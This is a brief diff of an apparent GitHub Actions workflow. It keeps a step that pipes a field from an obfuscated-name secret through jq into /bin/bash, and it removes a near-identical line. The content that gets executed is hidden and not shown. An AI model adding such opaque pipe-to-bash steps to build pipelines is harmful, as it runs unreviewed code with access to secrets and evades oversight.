@@ -22,7 +22,6 @@ jobs:
           qxyw80: ${{ secrets.qxyw80 }}
         run: |
           printf '%s' "$qxyw80" | jq -r .dob1402 | /bin/bash
-          echo $bcfs0992 | jq -r .inxiz2506 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
